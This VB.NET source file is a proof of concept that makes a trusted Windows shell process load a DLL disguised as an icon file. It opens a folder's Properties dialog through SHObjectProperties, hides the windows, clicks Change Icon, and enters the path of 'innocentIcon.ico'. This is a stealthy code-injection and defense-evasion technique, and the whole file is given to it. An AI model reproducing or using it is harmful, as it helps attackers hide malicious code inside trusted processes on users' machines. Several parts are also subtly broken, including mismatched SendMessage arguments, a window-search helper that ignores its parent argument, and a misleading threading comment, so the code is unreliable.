Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Threading.Tasks

Public Class Form1

    ' For SHObjectProperties
    <DllImport("shell32.dll")>
    Private Shared Function SHObjectProperties(ByVal hwnd As IntPtr, ByVal shopObjectType As SHOP_OBJECT_TYPE, ByVal pszObjectName As String, ByVal pszPropertyPage As String) As Integer
    End Function

    ' For StrStrW
    <DllImport("shlwapi.dll", CharSet:=CharSet.Unicode)>
    Private Shared Function StrStrW(ByVal pszFirst As String, ByVal pszSrch As String) As String
    End Function

    ' Can be anything, choose something distinct and long.
    Private dirName As String = "a9e91106-3c84-4ac8-942a-2913445aa715"

    Dim props As IntPtr = IntPtr.Zero
    Dim iconDialog As IntPtr = IntPtr.Zero

    Private Enum SHOP_OBJECT_TYPE
        SHOP_FILEPATH = 0
    End Enum

    Private Sub getInjectionWindow(ByVal hWnd As IntPtr, ByVal lparam As IntPtr)
        Dim titleLen As Integer = GetWindowTextLength(hWnd)

        ' Optimization
        If titleLen <= dirName.Length Then
            Return
        End If

        Dim titleBuf As New String(CChar(" "), titleLen)
        GetWindowText(hWnd, titleBuf, titleLen + 1)

        ' When EnumWinodws is called for the first time, it finds the properties window.
        ' When it is called for the second time, it finds the change icon dialog window.
        If hWnd <> props AndAlso StrStrW(titleBuf, dirName) IsNot Nothing Then
            If props <> IntPtr.Zero Then
                iconDialog = hWnd
            Else
                props = hWnd
            End If
        End If
    End Sub

    Private Sub openChangeIcons()
        ' Creates a directory in appdata\temp.
        Dim tmpPath As String = Path.GetTempPath()
        Dim fullPath As String = Path.Combine(tmpPath, dirName)

        Directory.CreateDirectory(fullPath)

        ' Opens the properties window of the created directory.
        SHObjectProperties(IntPtr.Zero, SHOP_OBJECT_TYPE.SHOP_FILEPATH, fullPath, Nothing)

        ' Retrieves the handle of the properties window and hides it.
        Do While props = IntPtr.Zero
            EnumWindows(AddressOf getInjectionWindow, IntPtr.Zero)
        Loop
        CloseWindow(props)

        ' Retireves the handle of the SysTabControl32 window.
        Dim tabs As IntPtr = GetChildWindow(props)

        ' Switch to the customize tab.
        SendMessage(tabs, TCM_SETCURFOCUS, CType(4, IntPtr), IntPtr.Zero)

        ' Retrieves the handle of the Change Icon button.
        Dim changeIcon As IntPtr = GetChildWindow(GetChildWindow(props))

        ' The Change Icon button is being clicked. 
        ' This has to be executed in a separate thread because it returns after the Change Icon dialog has been closed.
        SendMessage(changeIcon, BM_CLICK, IntPtr.Zero, IntPtr.Zero)

        ' Remove directory.
        Directory.Delete(fullPath)
    End Sub

    Private Function GetChildWindow(ByVal parent As IntPtr) As IntPtr
        Dim child As IntPtr = IntPtr.Zero
        Do
            child = GetWindow(child, GW_HWNDNEXT)
            If child = IntPtr.Zero Then Exit Do
            If IsWindowVisible(child) Then Exit Do
        Loop
        Return child
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Opens the Change Icon dialog.
        Task.Factory.StartNew(Sub() openChangeIcons())

        ' Uses EnumWindows in second stage to find the change icon window.
        Do While iconDialog = IntPtr.Zero
            EnumWindows(AddressOf getInjectionWindow, IntPtr.Zero)
        Loop

        ' Hides the change icon window.
        CloseWindow(iconDialog)

        Dim exePath As String = Application.ExecutablePath
        Dim dllPath As String = Path.Combine(Path.GetDirectoryName(exePath), "innocentIcon.ico")

        ' Retrieves the handle to the input field and puts in the path of the DLL (in this case with an .ico extension)
        Dim edit As IntPtr = FindWindowEx(iconDialog, IntPtr.Zero, "Edit", Nothing)
        SetWindowText(edit, dllPath)

        ' Clicks the ok button.
        Dim ok As IntPtr = FindWindowEx(iconDialog, IntPtr.Zero, "Button", Nothing)
        SendMessage(ok, BM_CLICK, IntPtr.Zero, IntPtr.Zero)
    End Sub

    ' Import necessary Windows API functions
    Private Const GW_HWNDNEXT As Integer = 2
    Private Const TCM_SETCURFOCUS As Integer = &H1330
    Private Const BM_CLICK As Integer = &HF5
    'Public Property WM_SETTEXT As Integer
    Private Const WM_SETTEXT As Integer = &HC
    'Public Shared ReadOnly WM_SETTEXT As Integer = &HC
    Private Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthW" (ByVal hWnd As IntPtr) As Integer
    Private Declare Auto Function GetWindowText Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal lpString As String, ByVal cch As Integer) As Integer
    Private Declare Function EnumWindows Lib "user32.dll" (ByVal lpEnumFunc As EnumWindowsProc, ByVal lParam As IntPtr) As Boolean
    Private Delegate Sub EnumWindowsProc(ByVal hWnd As IntPtr, ByVal lParam As IntPtr)
    Private Declare Function GetWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal uCmd As Integer) As IntPtr
    Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageW" (ByVal hWnd As IntPtr, ByVal Msg As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    Private Declare Function CloseWindow Lib "user32.dll" (ByVal hWnd As IntPtr) As Boolean
    Private Declare Function IsWindowVisible Lib "user32.dll" (ByVal hWnd As IntPtr) As Boolean
    Private Declare Auto Function FindWindowEx Lib "user32.dll" (ByVal hWndParent As IntPtr, ByVal hWndChildAfter As IntPtr, ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr

    Private Sub SetWindowText(hWnd As IntPtr, text As String)
        SendMessage(hWnd, WM_SETTEXT, IntPtr.Zero, text)
    End Sub

End Class
